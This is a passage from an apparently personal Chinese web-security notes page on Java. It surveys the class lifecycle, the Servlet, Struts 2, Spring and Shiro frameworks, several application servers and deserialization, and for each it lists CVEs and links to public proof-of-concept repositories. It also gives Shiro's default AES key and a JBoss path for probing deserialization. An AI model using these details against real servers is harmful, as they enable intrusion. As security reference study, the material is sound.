&lt;p&gt;整体来说，Java 中类的生命周期如下：加载 (Loading) -&amp;gt; [ 连接 (Linking) : 验证 (Verification) -&amp;gt; 准备 (Perparation) -&amp;gt; 解析 (Resolutin) ] -&amp;gt; 初始化 (Initialization) -&amp;gt; 使用 (Using) -&amp;gt; 卸载 (Unloading) 。&lt;/p&gt;
&lt;p&gt;加载过程分为三步：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;通过全限定类名来获取定义此类的二进制字节流&lt;/li&gt;
&lt;li&gt;将字节流所代表的静态存储结构转化为方法区的运行时数据结构&lt;/li&gt;
&lt;li&gt;在内存中生成代表这个类的  &lt;code&gt;java.lang.Class&lt;/code&gt;  对象，作为方法区这个类的各种数据的访问入口&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;验证阶段主要用于确保 Class 文件的字节流符合当前虚拟机的要求，分为几步：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;判断文件格式：是否以  &lt;code&gt;0xCAFEBABE&lt;/code&gt;  开始，主次版本号是否在处理范围内&lt;/li&gt;
&lt;li&gt;元数据验证&lt;/li&gt;
&lt;li&gt;字节码验证&lt;/li&gt;
&lt;li&gt;符号引用验证&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;部分运行选项与说明&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#部分运行选项与说明&#34;&gt;#&lt;/a&gt; 部分运行选项与说明&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;-Xverify:none&lt;/code&gt;  关闭类加载时的验证措施&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;框架&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#框架&#34;&gt;#&lt;/a&gt; 框架&lt;/h1&gt;
&lt;h2 id=&#34;servlet&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#servlet&#34;&gt;#&lt;/a&gt; Servlet&lt;/h2&gt;
&lt;h3 id=&#34;简介-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简介-2&#34;&gt;#&lt;/a&gt; 简介&lt;/h3&gt;
&lt;p&gt;Servlet (Server Applet) 是 Java Servlet 的简称，称为小服务程序或服务连接器，是用 Java 编写的服务器端程序，主要功能在于交互式地浏览和修改数据，生成动态 Web 内容。&lt;/p&gt;
&lt;p&gt;狭义的 Servlet 是指 Java 语言实现的一个接口，广义的 Servlet 是指任何实现了这个 Servlet 接口的类，一般情况下，人们将 Servlet 理解为后者。Servlet 运行于支持 Java 的应用服务器中。从原理上讲，Servlet 可以响应任何类型的请求，但绝大多数情况下 Servlet 只用来扩展基于 HTTP 协议的 Web 服务器。&lt;/p&gt;
&lt;h3 id=&#34;生命周期为&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#生命周期为&#34;&gt;#&lt;/a&gt; 生命周期为&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;客户端请求该 Servlet&lt;/li&gt;
&lt;li&gt;加载 Servlet 类到内存&lt;/li&gt;
&lt;li&gt;实例化并调用 init () 方法初始化该 Servlet&lt;/li&gt;
&lt;li&gt;service ()(根据请求方法不同调用  &lt;code&gt;doGet()&lt;/code&gt;  /  &lt;code&gt;doPost()&lt;/code&gt;  / ... /  &lt;code&gt;destroy()&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;接口&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#接口&#34;&gt;#&lt;/a&gt; 接口&lt;/h3&gt;
&lt;pre&gt;&lt;code&gt;init()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;在 Servlet 的生命期中，仅执行一次 init () 方法，在服务器装入 Servlet 时执行。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;service()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;service () 方法是 Servlet 的核心。每当一个客户请求一个 HttpServlet 对象，该对象的  &lt;code&gt;service()&lt;/code&gt;  方法就要被调用，而且传递给这个方法一个 &amp;quot;请求&amp;quot;(ServletRequest) 对象和一个 &amp;quot;响应&amp;quot;(ServletResponse) 对象作为参数。&lt;/p&gt;
&lt;h2 id=&#34;struts-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#struts-2&#34;&gt;#&lt;/a&gt; Struts 2&lt;/h2&gt;
&lt;h3 id=&#34;简介-3&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简介-3&#34;&gt;#&lt;/a&gt; 简介&lt;/h3&gt;
&lt;p&gt;Struts2 是一个基于 MVC 设计模式的 Web 应用框架，它本质上相当于一个 servlet，在 MVC 设计模式中，Struts2 作为控制器 (Controller) 来建立模型与视图的数据交互。&lt;/p&gt;
&lt;h3 id=&#34;请求流程&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#请求流程&#34;&gt;#&lt;/a&gt; 请求流程&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;客户端发送请求的 tomcat 服务器&lt;/li&gt;
&lt;li&gt;请求经过一系列过滤器&lt;/li&gt;
&lt;li&gt;FilterDispatcher 调用 ActionMapper 来决定这个请求是否要调用某个 Action&lt;/li&gt;
&lt;li&gt;ActionMppaer 决定调用某个 ActionFilterDispatcher 把请求给 ActionProxy&lt;/li&gt;
&lt;li&gt;ActionProxy 通过 Configuration Manager 查看 structs.xml，找到对应的 Action 类&lt;/li&gt;
&lt;li&gt;ActionProxy 创建一个 ActionInvocation 对象&lt;/li&gt;
&lt;li&gt;ActionInvocation 对象回调 Action 的 execute 方法&lt;/li&gt;
&lt;li&gt;Action 执行完毕后，ActionInvocation 根据返回的字符串，找到相应的 result，通过 HttpServletResponse 返回给服务器&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;相关cve&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#相关cve&#34;&gt;#&lt;/a&gt; 相关 CVE&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;CVE-2016-3081 (S2-032)&lt;/li&gt;
&lt;li&gt;CVE-2016-3687 (S2-033)&lt;/li&gt;
&lt;li&gt;CVE-2016-4438 (S2-037)&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2ltbXVuaW8vYXBhY2hlLXN0cnV0czItQ1ZFLTIwMTctNTYzOA==&#34;&gt;CVE-2017-5638&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;CVE-2017-7672&lt;/li&gt;
&lt;li&gt;CVE-2017-9787&lt;/li&gt;
&lt;li&gt;CVE-2017-9793&lt;/li&gt;
&lt;li&gt;CVE-2017-9804&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL21hemVuMTYwL3N0cnV0cy1wd25fQ1ZFLTIwMTctOTgwNQ==&#34;&gt;CVE-2017-9805&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2JyaWFud3JmL1MyLTA1My1DVkUtMjAxNy0xMjYxMQ==&#34;&gt;CVE-2017-12611&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;CVE-2017-15707&lt;/li&gt;
&lt;li&gt;CVE-2018-1327&lt;/li&gt;
&lt;li&gt;CVE-2018-11776&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;spring&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#spring&#34;&gt;#&lt;/a&gt; Spring&lt;/h2&gt;
&lt;h3 id=&#34;简介-4&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简介-4&#34;&gt;#&lt;/a&gt; 简介&lt;/h3&gt;
&lt;p&gt;Spring 一般指的是 Spring Framework，一个轻量级 Java 应用程序开源框架，提供了简易的开发方式。&lt;/p&gt;
&lt;h3 id=&#34;spring-mvc&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#spring-mvc&#34;&gt;#&lt;/a&gt; Spring MVC&lt;/h3&gt;
&lt;p&gt;Spring MVC 根据 Spring 的模式设计的 MVC 框架，主要用于开发 Web 应用，简化开发。&lt;/p&gt;
&lt;h3 id=&#34;spring-boot&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#spring-boot&#34;&gt;#&lt;/a&gt; Spring Boot&lt;/h3&gt;
&lt;p&gt;Spring 在推出之初方案较为繁琐，因此提供了 Spring Boot 作为自动化配置工具，降低项目搭建的复杂度。&lt;/p&gt;
&lt;h3 id=&#34;请求流程-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#请求流程-2&#34;&gt;#&lt;/a&gt; 请求流程&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;用户发送请求给服务器&lt;/li&gt;
&lt;li&gt;服务器收到请求，使用 DispatchServlet 处理&lt;/li&gt;
&lt;li&gt;Dispatch 使用 HandleMapping 检查 url 是否有对应的 Controller，如果有，执行&lt;/li&gt;
&lt;li&gt;如果 Controller 返回字符串，ViewResolver 将字符串转换成相应的视图对象&lt;/li&gt;
&lt;li&gt;DispatchServlet 将视图对象中的数据，输出给服务器&lt;/li&gt;
&lt;li&gt;服务器将数据输出给客户端&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;cve概览&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#cve概览&#34;&gt;#&lt;/a&gt; CVE 概览&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;CVE-2018-1270
&lt;ul&gt;
&lt;li&gt;Spring Websocket 远程代码执行漏洞&lt;/li&gt;
&lt;li&gt;Spring Framework 5.0 - 5.0.5&lt;/li&gt;
&lt;li&gt;Spring Framework 4.3 - 4.3.15&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;CVE-2018-1273
&lt;ul&gt;
&lt;li&gt;Spring Data 远程代码执行漏洞&lt;/li&gt;
&lt;li&gt;Spring Data Commons 1.13 - 1.13.10&lt;/li&gt;
&lt;li&gt;Spring Data Commons 2.0 - 2.0.5&lt;/li&gt;
&lt;li&gt;Spring Data REST 2.6 - 2.6.10&lt;/li&gt;
&lt;li&gt;Spring Data REST 3.0 - 3.0.5&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;CVE-2017-8046
&lt;ul&gt;
&lt;li&gt;Spring Data REST 远程代码执行漏洞&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;CVE-2017-4971
&lt;ul&gt;
&lt;li&gt;Spring Web Flow 远程代码执行漏洞&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;shiro&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#shiro&#34;&gt;#&lt;/a&gt; Shiro&lt;/h2&gt;
&lt;h3 id=&#34;简介-5&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简介-5&#34;&gt;#&lt;/a&gt; 简介&lt;/h3&gt;
&lt;p&gt;Apache Shiro 是一个功能强大且易于使用的 Java 安全框架，功能包括身份验证，授权，加密和会话管理。&lt;/p&gt;
&lt;h3 id=&#34;cve概览-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#cve概览-2&#34;&gt;#&lt;/a&gt; CVE 概览&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;CVE-2020-13933
&lt;ul&gt;
&lt;li&gt;Apache Shiro &amp;lt; 1.6.0&lt;/li&gt;
&lt;li&gt;身份验证绕过漏洞&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;CVE-2020-11989
&lt;ul&gt;
&lt;li&gt;SHIRO-782&lt;/li&gt;
&lt;li&gt;Apache Shiro &amp;lt; 1.5.3&lt;/li&gt;
&lt;li&gt;身份验证绕过漏洞&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;CVE-2020-1957
&lt;ul&gt;
&lt;li&gt;SHIRO-682&lt;/li&gt;
&lt;li&gt;Apache Shiro &amp;lt; 1.5.2&lt;/li&gt;
&lt;li&gt;身份验证绕过漏洞&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;CVE-2019-12422
&lt;ul&gt;
&lt;li&gt;SHIRO-721&lt;/li&gt;
&lt;li&gt;Apache Shiro &amp;lt; 1.4.2&lt;/li&gt;
&lt;li&gt;Padding Oracle Attack 远程代码执行漏洞&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;CVE-2016-4437
&lt;ul&gt;
&lt;li&gt;SHIRO-550&lt;/li&gt;
&lt;li&gt;Apache Shiro &amp;lt;= 1.2.4&lt;/li&gt;
&lt;li&gt;反序列化远程代码执行漏洞&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;CVE-2014-0074
&lt;ul&gt;
&lt;li&gt;SHIRO-460&lt;/li&gt;
&lt;li&gt;Apache Shiro &amp;lt; 1.2.3&lt;/li&gt;
&lt;li&gt;身份验证绕过漏洞&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;cve-2020-13933&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#cve-2020-13933&#34;&gt;#&lt;/a&gt; CVE-2020-13933&lt;/h3&gt;
&lt;p&gt;Apache Shiro 1.6.0 之前的版本，由于 Shiro 拦截器与 requestURI 的匹配流程与 Web 框架的拦截器的匹配流程有差异，攻击者构造一个特殊的 http 请求，可以绕过 Shiro 的认证，未授权访问敏感路径。&lt;/p&gt;
&lt;h3 id=&#34;cve-2020-11989&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#cve-2020-11989&#34;&gt;#&lt;/a&gt; CVE-2020-11989&lt;/h3&gt;
&lt;p&gt;Apache Shiro 1.5.3 之前的版本，由于 Shiro 拦截器与 requestURI 的匹配流程与 Web 框架的拦截器的匹配流程有差异，攻击者构造一个特殊的 http 请求，可以绕过 Shiro 的认证，未授权访问敏感路径。此漏洞存在两种攻击方式。&lt;/p&gt;
&lt;h3 id=&#34;cve-2020-1957&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#cve-2020-1957&#34;&gt;#&lt;/a&gt; CVE-2020-1957&lt;/h3&gt;
&lt;p&gt;Apache Shiro 1.5.2 之前的版本，由于 Shiro 拦截器与 requestURI 的匹配流程与 Web 框架的拦截器的匹配流程有差异，攻击者构造一个特殊的 http 请求，可以绕过 Shiro 的认证，未授权访问敏感路径。&lt;/p&gt;
&lt;h3 id=&#34;cve-2019-12422&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#cve-2019-12422&#34;&gt;#&lt;/a&gt; CVE-2019-12422&lt;/h3&gt;
&lt;p&gt;Apache Shiro 1.4.2 之前的版本默认使用  &lt;code&gt;AES/CBC/PKCS5Padding&lt;/code&gt;  模式加密，开启 RememberMe 功能的 Shiro 组件将允许远程攻击者构造序列化数据，通过 Padding Oracle Attack 进行爆破，即使在秘钥未知的条件下，也可以在目标服务器上执行任意命令。&lt;/p&gt;
&lt;h3 id=&#34;cve-2016-4437&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#cve-2016-4437&#34;&gt;#&lt;/a&gt; CVE-2016-4437&lt;/h3&gt;
&lt;p&gt;Apache Shiro 1.2.5 之前的版本在  &lt;code&gt;org.apache.shiro.mgt.AbstractRememberMeManager&lt;/code&gt;  中存在 AES 默认秘钥  &lt;code&gt;kPH+bIxk5D2deZiIxcaaaA==&lt;/code&gt;  ，开启 RememberMe 功能的 Shiro 组件将允许远程攻击者构造序列化数据，在目标服务器上执行任意命令。&lt;/p&gt;
&lt;h1 id=&#34;容器&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#容器&#34;&gt;#&lt;/a&gt; 容器&lt;/h1&gt;
&lt;p&gt;常见的 Java 服务器有 Tomcat、Weblogic、JBoss、GlassFish、Jetty、Resin、IBM Websphere 等，这里对部分框架做一个简单的说明。&lt;/p&gt;
&lt;h2 id=&#34;tomcat&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#tomcat&#34;&gt;#&lt;/a&gt; Tomcat&lt;/h2&gt;
&lt;p&gt;Tomcat 是一个轻量级应用服务器，在中小型系统和并发访问用户不是很多的场合下被普遍使用，用于开发和调试 JSP 程序。&lt;/p&gt;
&lt;p&gt;在收到请求后，Tomcat 的处理流程如下：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;客户端访问 Web 服务器，发送 HTTP 请求&lt;/li&gt;
&lt;li&gt;Web 服务器接收到请求后，传递给 Servlet 容器&lt;/li&gt;
&lt;li&gt;Servlet 容器加载 Servlet，产生 Servlet 实例后，向其传递表示请求和响应的对象&lt;/li&gt;
&lt;li&gt;Servlet 实例使用请求对象得到客户端的请求信息，然后进行相应的处理&lt;/li&gt;
&lt;li&gt;Servlet 实例将处理结果通过响应对象发送回客户端，容器负责确保响应正确送出，同时将控制返回给 Web 服务器&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Tomcat 服务器是由一系列可配置的组件构成的，其中核心组件是 Catalina Servlet 容器，它是所有其他 Tomcat 组件的顶层容器。&lt;/p&gt;
&lt;h3 id=&#34;相关cve-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#相关cve-2&#34;&gt;#&lt;/a&gt; 相关 CVE&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;CVE-2020-1938
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vdnVscy8yMjgxMDguaHRtbA==&#34;&gt;https://www.freebuf.com/vuls/228108.html&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;CVE-2019-0232
&lt;ul&gt;
&lt;li&gt;远程代码执行&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3B5bjNyZC9DVkUtMjAxOS0wMjMyLw==&#34;&gt;https://github.com/pyn3rd/CVE-2019-0232/&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;CVE-2017-12615
&lt;ul&gt;
&lt;li&gt;任意文件写入&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3M/X19iaXo9TXpJMU5EZzRNVEl4TXc9PSZhbXA7bWlkPTIyNDc0ODM2NTkmYW1wO2lkeD0xJmFtcDtzbj1jMjNiM2EzYjNiNDNkNzA5OTliZGJlNjQ0ZTc5ZjdlNQ==&#34;&gt;https://mp.weixin.qq.com/s?__biz=MzI1NDg4MTIxMw==&amp;amp;mid=2247483659&amp;amp;idx=1&amp;amp;sn=c23b3a3b3b43d70999bdbe644e79f7e5&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;CVE-2013-2067&lt;/li&gt;
&lt;li&gt;CVE-2012-4534&lt;/li&gt;
&lt;li&gt;CVE-2012-4431&lt;/li&gt;
&lt;li&gt;CVE-2012-3546&lt;/li&gt;
&lt;li&gt;CVE-2012-3544&lt;/li&gt;
&lt;li&gt;CVE-2012-2733&lt;/li&gt;
&lt;li&gt;CVE-2011-3375&lt;/li&gt;
&lt;li&gt;CVE-2011-3190&lt;/li&gt;
&lt;li&gt;CVE-2008-2938&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;weblogic&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#weblogic&#34;&gt;#&lt;/a&gt; Weblogic&lt;/h2&gt;
&lt;h3 id=&#34;简介-6&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简介-6&#34;&gt;#&lt;/a&gt; 简介&lt;/h3&gt;
&lt;p&gt;WebLogic 是美国 Oracle 公司出品的一个 Application Server，是一个基于 Java EE 架构的中间件，WebLogic 是用于开发、集成、部署和管理大型分布式 Web 应用、网络应用和数据库应用的 Java 应用服务器。其将 Java 的动态功能和 Java Enterprise 标准的安全性引入大型网络应用的开发、集成、部署和管理之中。&lt;/p&gt;
&lt;p&gt;WebLogic 对业内多种标准的全面支持，包括 EJB、JSP、Servlet、JMS、JDBC 等。&lt;/p&gt;
&lt;h3 id=&#34;相关cve-3&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#相关cve-3&#34;&gt;#&lt;/a&gt; 相关 CVE&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;CVE-2019-2725
&lt;ul&gt;
&lt;li&gt;wls-wsat 反序列化远程代码执行&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;CVE-2019-2658&lt;/li&gt;
&lt;li&gt;CVE-2019-2650&lt;/li&gt;
&lt;li&gt;CVE-2019-2649&lt;/li&gt;
&lt;li&gt;CVE-2019-2648&lt;/li&gt;
&lt;li&gt;CVE-2019-2647&lt;/li&gt;
&lt;li&gt;CVE-2019-2646&lt;/li&gt;
&lt;li&gt;CVE-2019-2645&lt;/li&gt;
&lt;li&gt;CVE-2019-2618
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL2phczUwMm4vY3ZlLTIwMTktMjYxOC8=&#34;&gt;https://github.com/jas502n/cve-2019-2618/&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;CVE-2019-2615&lt;/li&gt;
&lt;li&gt;CVE-2019-2568&lt;/li&gt;
&lt;li&gt;CVE-2018-3252&lt;/li&gt;
&lt;li&gt;CVE-2018-3248&lt;/li&gt;
&lt;li&gt;CVE-2018-3245&lt;/li&gt;
&lt;li&gt;CVE-2018-3201&lt;/li&gt;
&lt;li&gt;CVE-2018-3197&lt;/li&gt;
&lt;li&gt;CVE-2018-3191
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3ZvaWRmeW9vL0NWRS0yMDE4LTMxOTE=&#34;&gt;https://github.com/voidfyoo/CVE-2018-3191&lt;/span&gt;&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL0xpYnJhZ2dib25kL0NWRS0yMDE4LTMxOTE=&#34;&gt;https://github.com/Libraggbond/CVE-2018-3191&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;CVE-2018-2894
&lt;ul&gt;
&lt;li&gt;任意文件上传&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvMjQ1OA==&#34;&gt;https://xz.aliyun.com/t/2458&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;CVE-2018-2893
&lt;ul&gt;
&lt;li&gt;反序列化&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuZnJlZWJ1Zi5jb20vdnVscy8xNzgxMDUuaHRtbA==&#34;&gt;https://www.freebuf.com/vuls/178105.html&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;CVE-2018-2628
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvbllZNHpnMm0yeHNxVDBHWGE5cE1HQQ==&#34;&gt;https://mp.weixin.qq.com/s/nYY4zg2m2xsqT0GXa9pMGA&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;CVE-2018-1258&lt;/li&gt;
&lt;li&gt;CVE-2017-10271
&lt;ul&gt;
&lt;li&gt;XMLDecoder 反序列化漏洞&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3dlYmNhY2hlLmdvb2dsZXVzZXJjb250ZW50LmNvbS9zZWFyY2g/cT1jYWNoZSUzQXNIN2o4VEY4dU9JSiUzQXd3dy5mcmVlYnVmLmNvbSUyRnZ1bHMlMkYxNjAzNjcuaHRtbA==&#34;&gt;http://webcache.googleusercontent.com/search?q=cache%3AsH7j8TF8uOIJ%3Awww.freebuf.com%2Fvuls%2F160367.html&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;CVE-2017-3248&lt;/li&gt;
&lt;li&gt;CVE-2016-3510&lt;/li&gt;
&lt;li&gt;CVE-2015-4852
&lt;ul&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9naXRodWIuY29tL3JvbzdicmVhay9zZXJpYWxhdG9y&#34;&gt;https://github.com/roo7break/serialator&lt;/span&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;jboss&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#jboss&#34;&gt;#&lt;/a&gt; JBoss&lt;/h2&gt;
&lt;h3 id=&#34;简介-7&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简介-7&#34;&gt;#&lt;/a&gt; 简介&lt;/h3&gt;
&lt;p&gt;JBoss 是一个基于 J2EE 的管理 EJB 的容器和服务器，但 JBoss 核心服务不包括支持 servlet/JSP 的 WEB 容器，一般与 Tomcat 或 Jetty 绑定使用。&lt;/p&gt;
&lt;h3 id=&#34;相关cve-4&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#相关cve-4&#34;&gt;#&lt;/a&gt; 相关 CVE&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;CVE-2017-12149
&lt;ul&gt;
&lt;li&gt;反序列化漏洞&lt;/li&gt;
&lt;li&gt;访问  &lt;code&gt;/invoker/readonly&lt;/code&gt;  ，页面存在即有反序列化漏洞&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;jetty&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#jetty&#34;&gt;#&lt;/a&gt; Jetty&lt;/h2&gt;
&lt;h3 id=&#34;简介-8&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简介-8&#34;&gt;#&lt;/a&gt; 简介&lt;/h3&gt;
&lt;p&gt;Jetty 是一个开源的 servlet 容器。&lt;/p&gt;
&lt;h1 id=&#34;沙箱&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#沙箱&#34;&gt;#&lt;/a&gt; 沙箱&lt;/h1&gt;
&lt;h2 id=&#34;简介-9&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简介-9&#34;&gt;#&lt;/a&gt; 简介&lt;/h2&gt;
&lt;p&gt;Java 实现了一套沙箱环境，使远程的非可信代码只能在受限的环境下执行。&lt;/p&gt;
&lt;h2 id=&#34;相关cve-5&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#相关cve-5&#34;&gt;#&lt;/a&gt; 相关 CVE&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;CVE-2012-0507&lt;/li&gt;
&lt;li&gt;CVE-2012-4681&lt;/li&gt;
&lt;li&gt;CVE-2017-3272&lt;/li&gt;
&lt;li&gt;CVE-2017-3289&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;反序列化&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#反序列化&#34;&gt;#&lt;/a&gt; 反序列化&lt;/h1&gt;
&lt;h2 id=&#34;简介-10&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简介-10&#34;&gt;#&lt;/a&gt; 简介&lt;/h2&gt;
&lt;p&gt;序列化就是把对象转换成字节流，便于保存在内存、文件、数据库中；反序列化即逆过程，由字节流还原成对象。一般用于远程调用、通过网络将对象传输至远程服务器、存储对象到数据库或本地等待重用等场景中。Java 中的  &lt;code&gt;ObjectOutputStream&lt;/code&gt;  类的  &lt;code&gt;writeObject()&lt;/code&gt;  方法可以实现序列化，类  &lt;code&gt;ObjectInputStream&lt;/code&gt;  类的  &lt;code&gt;readObject()&lt;/code&gt;  方法用于反序列化。如果要实现类的反序列化，则是对其实现  &lt;code&gt;Serializable&lt;/code&gt;  接口。&lt;/p&gt;
&lt;p&gt;当远程服务接受不可信的数据并进行反序列化且当前环境中存在可利用的类时，就认为存在反序列化漏洞。&lt;/p&gt;
&lt;h3 id=&#34;序列数据结构&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#序列数据结构&#34;&gt;#&lt;/a&gt; 序列数据结构&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;0xaced&lt;/code&gt;  魔术头 / STREAM_MAGIC&lt;/li&gt;
&lt;li&gt;&lt;code&gt;0x0005&lt;/code&gt;  版本号 / STREAM_VERSION / 参考 java.io.ObjectStreamConstants&lt;/li&gt;
&lt;li&gt;&lt;code&gt;0x73&lt;/code&gt;  对象类型标识&lt;/li&gt;
&lt;li&gt;&lt;code&gt;0x72&lt;/code&gt;  类描述符标识&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;序列化流程&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#序列化流程&#34;&gt;#&lt;/a&gt; 序列化流程&lt;/h3&gt;
&lt;ul&gt;
